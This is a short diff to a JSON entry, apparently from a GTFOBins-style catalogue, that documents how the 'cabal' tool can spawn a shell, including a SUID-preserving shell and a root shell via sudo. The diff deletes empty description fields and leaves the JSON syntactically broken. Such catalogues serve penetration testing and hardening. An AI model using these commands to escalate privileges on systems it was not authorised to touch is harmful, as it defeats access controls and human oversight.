@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "cabal exec -- /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./cabal exec -- /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo cabal exec -- /bin/sh\n"
       }
     ]
